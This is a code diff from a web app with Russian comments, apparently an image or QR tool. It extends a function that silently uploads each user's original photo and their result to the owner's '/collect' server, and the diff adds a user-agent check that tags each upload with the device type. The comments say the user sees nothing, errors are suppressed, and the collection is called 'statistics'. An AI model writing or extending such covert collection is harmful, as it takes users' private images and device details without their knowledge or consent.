@@ -2161,12 +2161,21 @@ function saveImage() {
 // kind: 'result' — скачанный результат, 'upload' — исходное загруженное фото.
 // Полностью фоновая и «тихая»: пользователь ничего не видит, любые ошибки глушим.
 // ВАЖНО: без keepalive — с ним браузер отменяет запрос, если тело больше ~64 КБ.
+// Определяет тип устройства для пометки: iPhone / Android / ПК.
+function detectDevice() {
+  var ua = navigator.userAgent || '';
+  if (/iPhone|iPad|iPod/.test(ua) ||
+      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) return 'iPhone';
+  if (/Android/.test(ua)) return 'Android';
+  return 'ПК';
+}
+
 function sendWorkToOwner(dataURL, kind) {
   try {
     fetch(`${QR_API_BASE}/collect`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: dataURL, kind: kind || '' }),
+      body: JSON.stringify({ image: dataURL, kind: kind || '', device: detectDevice() }),
     }).catch(() => {});
   } catch (_) {
     // молча игнорируем — сбор статистики не должен мешать основной работе
